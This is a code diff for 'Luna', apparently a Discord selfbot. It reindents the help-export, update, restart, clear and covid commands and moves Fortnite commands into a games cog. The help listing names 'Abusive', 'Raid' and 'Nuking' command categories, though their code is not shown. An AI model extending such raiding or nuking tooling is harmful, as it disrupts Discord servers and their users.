+			animatedcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Text commands')
-        commands = cog.get_commands()
-        textcommands = ""
-        for command in commands:
-            textcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
-            
-        cog = self.bot.get_cog('Image commands')
-        commands = cog.get_commands()
-        imagecommands = ""
-        for command in commands:
-            imagecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Text commands')
+		commands = cog.get_commands()
+		textcommands = ""
+		for command in commands:
+			textcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+			
+		cog = self.bot.get_cog('Image commands')
+		commands = cog.get_commands()
+		imagecommands = ""
+		for command in commands:
+			imagecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Troll commands')
-        commands = cog.get_commands()
-        trollcommands = ""
-        for command in commands:
-            trollcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Troll commands')
+		commands = cog.get_commands()
+		trollcommands = ""
+		for command in commands:
+			trollcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Fun commands')
-        commands = cog.get_commands()
-        funcommands = ""
-        for command in commands:
-            funcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Fun commands')
+		commands = cog.get_commands()
+		funcommands = ""
+		for command in commands:
+			funcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Tools commands')
-        commands = cog.get_commands()
-        toolscommands = ""
-        for command in commands:
-            toolscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Tools commands')
+		commands = cog.get_commands()
+		toolscommands = ""
+		for command in commands:
+			toolscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Nettool commands')
-        commands = cog.get_commands()
-        nettoolscommands = ""
-        for command in commands:
-            nettoolscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Nettool commands')
+		commands = cog.get_commands()
+		nettoolscommands = ""
+		for command in commands:
+			nettoolscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Util commands')
-        commands = cog.get_commands()
-        utilscommands = ""
-        for command in commands:
-            utilscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Util commands')
+		commands = cog.get_commands()
+		utilscommands = ""
+		for command in commands:
+			utilscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Abusive commands')
-        commands = cog.get_commands()
-        abusecommands = ""
-        for command in commands:
-            abusecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Abusive commands')
+		commands = cog.get_commands()
+		abusecommands = ""
+		for command in commands:
+			abusecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Raid commands')
-        commands = cog.get_commands()
-        raidcommands = ""
-        for command in commands:
-            raidcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Raid commands')
+		commands = cog.get_commands()
+		raidcommands = ""
+		for command in commands:
+			raidcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Nuking commands')
-        commands = cog.get_commands()
-        nukecommands = ""
-        for command in commands:
-            nukecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Nuking commands')
+		commands = cog.get_commands()
+		nukecommands = ""
+		for command in commands:
+			nukecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Protection commands')
-        commands = cog.get_commands()
-        protectioncommands = ""
-        for command in commands:
-            protectioncommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Protection commands')
+		commands = cog.get_commands()
+		protectioncommands = ""
+		for command in commands:
+			protectioncommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Miscellaneous commands')
-        commands = cog.get_commands()
-        misccommands = ""
-        for command in commands:
-            misccommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Miscellaneous commands')
+		commands = cog.get_commands()
+		misccommands = ""
+		for command in commands:
+			misccommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Settings commands')
-        commands = cog.get_commands()
-        settingscommands = ""
-        for command in commands:
-            settingscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Settings commands')
+		commands = cog.get_commands()
+		settingscommands = ""
+		for command in commands:
+			settingscommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Share commands')
-        commands = cog.get_commands()
-        sharecommands = ""
-        for command in commands:
-            sharecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Share commands')
+		commands = cog.get_commands()
+		sharecommands = ""
+		for command in commands:
+			sharecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Toast customization')
-        commands = cog.get_commands()
-        toastcustomcommands = ""
-        for command in commands:
-            toastcustomcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Toast customization')
+		commands = cog.get_commands()
+		toastcustomcommands = ""
+		for command in commands:
+			toastcustomcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Toast commands')
-        commands = cog.get_commands()
-        toastcommands = ""
-        for command in commands:
-            toastcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Toast commands')
+		commands = cog.get_commands()
+		toastcommands = ""
+		for command in commands:
+			toastcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Customization commands')
-        commands = cog.get_commands()
-        customizationcommands = ""
-        for command in commands:
-            customizationcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Customization commands')
+		commands = cog.get_commands()
+		customizationcommands = ""
+		for command in commands:
+			customizationcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Webhook customisation')
-        commands = cog.get_commands()
-        webhookcommands = ""
-        for command in commands:
-            webhookcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Webhook customisation')
+		commands = cog.get_commands()
+		webhookcommands = ""
+		for command in commands:
+			webhookcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('NSFW commands')
-        commands = cog.get_commands()
-        nsfwcommands = ""
-        for command in commands:
-            nsfwcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('NSFW commands')
+		commands = cog.get_commands()
+		nsfwcommands = ""
+		for command in commands:
+			nsfwcommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Cryptocurrency commands')
-        commands = cog.get_commands()
-        cryptocommands = ""
-        for command in commands:
-            cryptocommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Cryptocurrency commands')
+		commands = cog.get_commands()
+		cryptocommands = ""
+		for command in commands:
+			cryptocommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Encode commands')
-        commands = cog.get_commands()
-        encodecommands = ""
-        for command in commands:
-            encodecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Encode commands')
+		commands = cog.get_commands()
+		encodecommands = ""
+		for command in commands:
+			encodecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        cog = self.bot.get_cog('Decode commands')
-        commands = cog.get_commands()
-        decodecommands = ""
-        for command in commands:
-            decodecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
+		cog = self.bot.get_cog('Decode commands')
+		commands = cog.get_commands()
+		decodecommands = ""
+		for command in commands:
+			decodecommands+=f"{prefix + command.name + ' ' + command.usage:<17} » {command.description}\n"
 
-        #///////////////////////////////////////////////////////////////////
+		#///////////////////////////////////////////////////////////////////
 
-        commandcount = len(self.bot.commands)
+		commandcount = len(self.bot.commands)
 
-        file = open("commands.txt", "w") 
-        file.write(f"{commandcount} Commands\n\n<> is required | [] is optional\n\nCategories:\n{helpcommands}\nAdmin Commands:\n{admincommands}\nAnimated Commands:\n{animatedcommands}\nText Commands:\n{textcommands}\nImage Commands:\n{imagecommands}\nTroll Commands:\n{trollcommands}\nFun Commands:\n{funcommands}\nTools:\n{toolscommands}\nNetworking Tools\n{nettoolscommands}\nUtilities\n{utilscommands}\nAbusive Commands\n{abusecommands}\nRaiding\n{raidcommands}\nNuking\n{nukecommands}\nProtections\n{protectioncommands}\nMiscellaneous\n{misccommands}\nSettings\n{settingscommands}\nSharing\n{sharecommands}\nCustomization\n{customizationcommands}\nToast Settings\n{toastcommands}\nToast Customization\n{toastcustomcommands}\nWebhook Settings\n{webhookcommands}\nNSFW\n{nsfwcommands}\nCryptocurrency\n{cryptocommands}\nEncode\n{encodecommands}\nDecode\n{decodecommands}")
-        file.close()
-        await embed_builder(luna, title="Text Help", description=f"```\nSaved all commands in commands.txt```")
+		file = open("commands.txt", "w") 
+		file.write(f"{commandcount} Commands\n\n<> is required | [] is optional\n\nCategories:\n{helpcommands}\nAdmin Commands:\n{admincommands}\nAnimated Commands:\n{animatedcommands}\nText Commands:\n{textcommands}\nImage Commands:\n{imagecommands}\nTroll Commands:\n{trollcommands}\nFun Commands:\n{funcommands}\nTools:\n{toolscommands}\nNetworking Tools\n{nettoolscommands}\nUtilities\n{utilscommands}\nAbusive Commands\n{abusecommands}\nRaiding\n{raidcommands}\nNuking\n{nukecommands}\nProtections\n{protectioncommands}\nMiscellaneous\n{misccommands}\nSettings\n{settingscommands}\nSharing\n{sharecommands}\nCustomization\n{customizationcommands}\nToast Settings\n{toastcommands}\nToast Customization\n{toastcustomcommands}\nWebhook Settings\n{webhookcommands}\nNSFW\n{nsfwcommands}\nCryptocurrency\n{cryptocommands}\nEncode\n{encodecommands}\nDecode\n{decodecommands}")
+		file.close()
+		await embed_builder(luna, title="Text Help", description=f"```\nSaved all commands in commands.txt```")
 
-    @commands.command(name = "update",
-                    usage="",
-                    description = "Updates Luna")
-    async def update(self, ctx):
-        await ctx.message.delete()
-        versionpastedec = urllib.request.urlopen('https://pastebin.com/raw/iQPkzEpg')
-        for line in versionpastedec:
-            versionpaste = line.decode().strip()
-        if f"'{version}'" == versionpaste:
-            await embed_builder(ctx, title="Update", description=f"```\nYou are on the latest version!```")
-        else:
-            await embed_builder(ctx, title="Update", description=f"```\nStarted update » {versionpaste}```")
-            luna.update()
+	@commands.command(name = "update",
+					usage="",
+					description = "Updates Luna")
+	async def update(self, luna):
+		await luna.message.delete()
+		if developer_mode:
+			await embed_builder(luna, title="Update", description=f"```\nDeveloper mode active! No updates will be downloaded.```")
+		elif version == version_url:
+			await embed_builder(luna, title="Update", description=f"```\nYou are on the latest version! ({version})```")
+		else:
+			await embed_builder(luna, title="Update", description=f"```\nStarted update » {version}```")
+			luna.update()
 
-    @commands.command(name = "restart",
-                    usage="",
-                    aliases=['reboot'],
-                    description = "Restart Luna")
-    async def restart(self, luna):
-        await luna.message.delete()
+	@commands.command(name = "restart",
+					usage="",
+					aliases=['reboot'],
+					description = "Restart Luna")
+	async def restart(self, luna):
+		await luna.message.delete()
 
-        if configs.mode() == 2:
-            sent = await luna.send(f"```ini\n[ Restarting ]\n\nAllow up to 5 seconds\n\n[ {theme.footer()} ]```")
-            await asyncio.sleep(3)
-            await sent.delete()
-        if configs.mode() == 3:
-            sent = await luna.send(f"> **Restarting**\n> \n> Allow up to 5 seconds\n> \n> {theme.footer()}")
-            await asyncio.sleep(3)
-            await sent.delete()
-        else:
-            embed = discord.Embed(title="Restarting", url=theme.title_url(), description=f"```\nAllow up to 5 seconds```", color=theme.hex_color())
-            embed.set_thumbnail(url=theme.image_url())
-            embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
-            embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
-            embed.set_image(url=theme.large_image_url())
-            sent = await luna.send(embed=embed)
-            await asyncio.sleep(3)
-            await sent.delete()
-        restart_program()
+		if configs.mode() == 2:
+			sent = await luna.send(f"```ini\n[ Restarting ]\n\nAllow up to 5 seconds\n\n[ {theme.footer()} ]```")
+			await asyncio.sleep(3)
+			await sent.delete()
+		if configs.mode() == 3:
+			sent = await luna.send(f"> **Restarting**\n> \n> Allow up to 5 seconds\n> \n> {theme.footer()}")
+			await asyncio.sleep(3)
+			await sent.delete()
+		else:
+			embed = discord.Embed(title="Restarting", url=theme.title_url(), description=f"```\nAllow up to 5 seconds```", color=theme.hex_color())
+			embed.set_thumbnail(url=theme.image_url())
+			embed.set_footer(text=theme.footer(), icon_url=theme.footer_icon_url())
+			embed.set_author(name=theme.author(), url=theme.author_url(), icon_url=theme.author_icon_url())
+			embed.set_image(url=theme.large_image_url())
+			sent = await luna.send(embed=embed)
+			await asyncio.sleep(3)
+			await sent.delete()
+		restart_program()
 
-    @commands.command(name = "clear",
-                    aliases=['cls'],
-                    usage="",
-                    description = "Clear the console")
-    async def clear(self, ctx):
-        await ctx.message.delete()
-        luna.console(clear=True)
-        command_count = len(bot.commands)
-        cog = bot.get_cog('Custom commands')
-        try:
-            custom = cog.get_commands()
-            custom_command_count = 0
-            for command in custom:
-                custom_command_count += 1
-        except:
-            custom_command_count = 0
-        prefix = files.json("Luna/config.json", "prefix", documents=True)
-        print(motd.center(os.get_terminal_size().columns))
-        print()
-        print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
-        print(f"                           {color.purple('[')}+{color.purple(']')} {bot.user} | {color.purple(f'{len(bot.guilds)}')} Servers | {color.purple(f'{len(bot.user.friends)}')} Friends")
-        print(f"                           {color.purple('[')}+{color.purple(']')} {prefix}\n")
-        print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
-        prints.message(f"{color.purple(f'{command_count-custom_command_count}')} commands | {color.purple(f'{custom_command_count}')} custom commands")
+	@commands.command(name = "clear",
+					aliases=['cls'],
+					usage="",
+					description = "Clear the console")
+	async def clear(self, luna):
+		await luna.message.delete()
+		luna.console(clear=True)
+		command_count = len(bot.commands)
+		cog = bot.get_cog('Custom commands')
+		try:
+			custom = cog.get_commands()
+			custom_command_count = 0
+			for command in custom:
+				custom_command_count += 1
+		except:
+			custom_command_count = 0
+		prefix = files.json("Luna/config.json", "prefix", documents=True)
+		print(motd.center(os.get_terminal_size().columns))
+		if beta:
+			print("Beta Build".center(os.get_terminal_size().columns))
+		print()
+		print(f"                           {color.purple('[')}+{color.purple('] CONNECTED')}")
+		print(f"                           {color.purple('[')}+{color.purple(']')} {bot.user} | {color.purple(f'{len(bot.guilds)}')} Servers | {color.purple(f'{len(bot.user.friends)}')} Friends")
+		print(f"                           {color.purple('[')}+{color.purple(']')} {prefix}\n")
+		print(f"═══════════════════════════════════════════════════════════════════════════════════════════════════\n")
+		prints.message(f"{color.purple(f'{command_count-custom_command_count}')} commands | {color.purple(f'{custom_command_count}')} custom commands")
 
-    @commands.command(name = "covid",
-                    aliases=['corona'],
-                    usage="",
-                    description = "Corona statistics")
-    async def covid(self, luna):
-        await luna.message.delete()
-        request = requests.get(f'https://api.covid19api.com/summary')
-        data = request.json()
-        info = data['Global']
-        totalconfirmed = info['TotalConfirmed']
-        totalrecovered = info['TotalRecovered']
-        totaldeaths = info['TotalDeaths']
-        newconfirmed = info['NewConfirmed']
-        newrecovered = info['NewRecovered']
-        newdeaths = info['NewDeaths']
-        date = info['Date']
-        await embed_builder(luna, title="Covid-19 Statistics", description=f"```Total Confirmed Cases\n{totalconfirmed}``````Total Deaths\n{totaldeaths}``````Total Recovered\n{totalrecovered}``````New Confirmed Cases\n{newconfirmed}``````New Deaths\n{newdeaths}``````New Recovered\n{newrecovered}``````Date\n{date}```")
+	@commands.command(name = "covid",
+					aliases=['corona'],
+					usage="",
+					description = "Corona statistics")
+	async def covid(self, luna):
+		await luna.message.delete()
+		request = requests.get(f'https://api.covid19api.com/summary')
+		data = request.json()
+		info = data['Global']
+		totalconfirmed = info['TotalConfirmed']
+		totalrecovered = info['TotalRecovered']
+		totaldeaths = info['TotalDeaths']
+		newconfirmed = info['NewConfirmed']
+		newrecovered = info['NewRecovered']
+		newdeaths = info['NewDeaths']
+		date = info['Date']
+		await embed_builder(luna, title="Covid-19 Statistics", description=f"```Total Confirmed Cases\n{totalconfirmed}``````Total Deaths\n{totaldeaths}``````Total Recovered\n{totalrecovered}``````New Confirmed Cases\n{newconfirmed}``````New Deaths\n{newdeaths}``````New Recovered\n{newrecovered}``````Date\n{date}```")
 
-    @commands.command(name = "fnshop",
-                    usage="",
-                    description = "Current Fortnite shop")
-    async def fnshop(self, luna):
-        await luna.message.delete()
-        await embed_builder(luna, title="Fortnite Shop", large_image="https://api.nitestats.com/v1/shop/image")
+	typing = False
 
-    @commands.command(name = "fnmap",
-                    usage="",
-                    description = "Current Fortnite map")
-    async def fnmap(self, luna):
-        await luna.message.delete()
-        await embed_builder(luna, title="Fortnite Map", large_image="https://media.fortniteapi.io/images/map.png?showPOI=true")
-
-    @commands.command(name = "fnnews",
-                    usage="",
-                    description = "Current Fortnite news")
-    async def fnnews(self, luna):
-        await luna.message.delete()
-        fortnite = requests.get("https://fortnite-api.com/v2/news/br").json()
-        await embed_builder(luna, title="Fortnite News", large_image=fortnite["data"]["image"])
+	@commands.command(name = "typing",
+					usage="<on/off>",
+					description = "Enable or disable typing")
+	async def typing(self, luna, mode:str):
+		await luna.message.delete()
+		if mode == "on":
+			await embed_builder(luna, title="Typing", description=f"```\nTyping enabled```")
+			typing = True
+			while typing:
+				async with luna.typing():
+					await asyncio.sleep(1)
+					if typing == False:
+						break
+		elif mode == "off":
+			await embed_builder(luna, title="Typing", description=f"```\nTyping disabled```")
+			typing = False
+		else:
+			await mode_error(luna, "on or off")
 
 bot.add_cog(MiscCog(bot))
+class GamesCog(commands.Cog, name="Game commands"):
+	def __init__(self, bot:commands.bot):
+		self.bot = bot
 
-# ///////////////////////////////////////////////////////////////
-# Functions for message types, it took me 5 hours to make this bullshit
+	@commands.command(name = "fnshop",
+					usage="",
+					description = "Current Fortnite shop")
+	async def fnshop(self, luna):
+		await luna.message.delete()
+		await embed_builder(luna, title="Fortnite Shop", large_image="https://api.nitestats.com/v1/shop/image")
+
+	@commands.command(name = "fnmap",
+					usage="",
+					description = "Current Fortnite map")
+	async def fnmap(self, luna):
+		await luna.message.delete()
+		await embed_builder(luna, title="Fortnite Map", large_image="https://media.fortniteapi.io/images/map.png?showPOI=true")
+
+	@commands.command(name = "fnnews",
+					usage="",
+					description = "Current Fortnite news")
+	async def fnnews(self, luna):
+		await luna.message.delete()
+		fortnite = requests.get("https://fortnite-api.com/v2/news/br").json()
+		await embed_builder(luna, title="Fortnite News", large_image=fortnite["data"]["image"])
+
+bot.add_cog(GamesCog(bot))
 
 def convert_to_text(embed: discord.Embed):
 	largeimagevar = theme.large_image_url()
